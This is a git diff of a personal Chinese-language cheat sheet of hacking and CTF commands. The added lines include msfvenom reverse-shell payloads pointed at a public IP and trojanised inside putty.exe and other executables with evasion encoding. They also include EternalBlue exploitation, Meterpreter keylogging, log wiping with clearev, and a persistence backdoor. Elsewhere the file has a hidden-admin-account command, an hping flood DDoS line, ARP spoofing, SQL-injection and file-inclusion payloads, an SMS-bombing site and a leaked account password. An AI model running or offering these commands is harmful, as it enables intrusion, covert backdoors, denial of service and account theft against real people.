@@ -11,7 +11,7 @@
 9 sqlmap 扫描网站类型以及是否可以注入  sqlmap -u url/id=1 --tables ,--dump
 10 chrome 扩展插件(hackbar),类似于重发器
 11 base64转换 echo '需要转换的内容'  |base64
-12 nmap 端口扫描神器 nmap -A -T4 ip
+12 nmap 端口扫描 nmap -A -T4 ip
 13 hping DDOS攻击 hping3 -S -c 1000 -d 4096  -d 64 -w 1111 --flood ip 
 14 arpspoof arp欺骗 arpspoof -i 网卡 -t 目标ip 网关
 15 nethogs 监控网络流量
@@ -32,7 +32,7 @@
 30 zsteg  检测图片是否行有lsb隐写内容
 31 unar解压文件就不会乱码
 32 本地文件包含  php读取文件 ?file=php://filter/read/convert.base64-encode/resource=flag.php     
-33 Secret File 构造pyload ?file=php://filter/convert.base64-encode/resource=flag.php
+33 Secret File 构造pyload ?file=php://filter/convert.base64-encode/resource=flag.php php://filter/read=convert.base64-encode/resource=xxx
 34 php代码审计source.php?file=source.php?/../../../../ffffllllaaaagggg 
 35 dbeaver 数据库图形化软件
 36 sql万能登陆 ?username=admin%27or%271%27=%271&password=admin%27or%271%27=%271
@@ -68,8 +68,30 @@ webcam_snap 拍照
 webcam_stream  网页拍照
 
 50 msfconsole enternalblue x86机器使用 eternalblue_doublepulsar,如果失败用 set PROCESSINJECT explorer.exe set payload windows/meterpreter/reverse_tcp
-
-  
+51 apache 文件上传xxx.php.xxx
+52 目录穿越 http://eci-2zehy09y3rook5b2ywcg.cloudeci1.ichunqiu.com/img../ 点点需要跟在上一个文件夹后边
+53 octave 科学计算器
+54 Word给的文字类似禅语，故想到使用“与佛论禅”进行解码（开头记着加上佛曰两字）
+55 dnsenum --enum benet.com  DNSenum是一款非常强大的域名信息收集工具
+56 exploit/multi/handler 监听模块   必须设置这个set payload windows/meterpreter/reverse_tcp
+57 systeminfo > systeminfo_win10.txt 提取目标机器的系统信息,使用 python2 windows-exploit-suggester.py --database 2021-06-20-mssb.xls --systeminfo systeminfo_10.txt 列出可用漏洞
+58 木马的payload必须和监听设置的payload 对应
+59 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.112 LPORT=3335 -e x64/shikata_ga_nai -b '\x00\x0a\xff' -x 1.exe -i 40 -f exe -o 2.exe     windows直接反弹Shell
+60 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 R > newbie.apk 安卓
+61 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=1.116.58.229 LPORT=6789 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 15 -x 6789.exe -f exe -o muma.exe windows反弹
+62 auxiliary/server/socks_proxy   使用代理去访问主机 
+63 msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=1.116.58.229 LPORT=6789 -f exe -e x86/shikata_ga_nai -i 20 --encrypt aes256 -x putty.exe -o run.exe
+64 nmap -v -n -p445 --script smb-vuln-ms17-010 192.168.1.225/24 
+65 msfvenom -a x64 --platform linux  -p linux/x64/meterpreter/reverse_tcp  LHOST=1.116.58.229 LPORT=6759  -i 3 -f elf -o test
+66 net user test 123456 /add && net localgroup administrators test /add
+67 Arch显示bug nohup kwin_x11 --replace&
+68 短信轰炸 http://www.ydhz.xyz/wd/
+69 uictl enable  keyboard   启用键盘记录
+70 execute  -H -i -f cmd.exe 在后台打开cmd
+80 clearev 清理痕迹
+81 run persistence -U -X  -i 5 -p 6789 -r 1.116.58.229 创建隐藏后门
+82 migrate 1416
+83 Account:User_20210714154226 Password:vdvpV1Qk 魅族解锁bl帐号
 
 
 _______________文件头______________________________________________
@@ -110,4 +132,3 @@ ______________________________________________________________
 zip文件判断有无加密是在第7,8行,0000就是伪加密
 50 4B 01 02 是目录中文件头标记
 
- 
